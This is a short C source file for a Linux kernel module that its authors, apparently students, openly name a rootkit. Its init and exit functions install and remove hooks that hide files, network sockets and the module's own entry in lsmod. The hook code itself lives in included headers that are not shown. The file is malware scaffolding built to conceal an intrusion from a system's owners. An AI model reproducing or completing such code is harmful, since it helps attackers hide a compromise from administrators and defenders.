#include "filesystem.h"
#include "hideSocket.h"
#include "lsmod.h"
#include "jiffieez.h"
#include <linux/kernel.h>	     /* We're doing kernel work */
#include <linux/module.h>	     /* Specifically, a module */

MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("Paul Campbell :: Adam Przybyszewski :: Mike Salerno :: Kevin Hock");
MODULE_VERSION("0.0.1");
MODULE_DESCRIPTION("Any legal concerns should be directed at Donald Porter.");

static __init int rootkit_init(void){
	function_prologue();		
	init_filesystem_hook();
	init_socket_hook();
	init_lsmod_hook();
	function_epilogue();
	return 0;
}


static __exit void rootkit_exit(void){
	exit_lsmod_hook();
	exit_socket_hook();
	exit_filesystem_hook();
}


// Define the start and exit points of the module:
module_init(rootkit_init);
module_exit(rootkit_exit);


